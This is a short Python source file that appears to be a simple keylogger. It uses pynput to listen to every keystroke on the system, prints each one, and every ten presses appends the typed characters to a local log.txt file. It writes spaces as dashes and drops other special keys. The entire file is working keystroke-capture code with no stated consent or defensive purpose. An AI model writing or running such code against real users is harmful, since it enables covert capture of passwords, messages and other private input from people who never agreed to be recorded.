from pynput.keyboard import Listener


count = 0
keys = []

def on_press(key):
    global keys, count
    
    keys.append(key)
    count += 1 
    print("{0} pressed".format(key))
    
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a", encoding="utf-8") as f:
        for key in keys:
            k = str(key).replace("", "")
            if k.find("space") > 0:
                f.write("-")
            elif k.find("Key") == -1:
                f.write(k)
        
with Listener(on_press=on_press) as listener:
    listener.join()
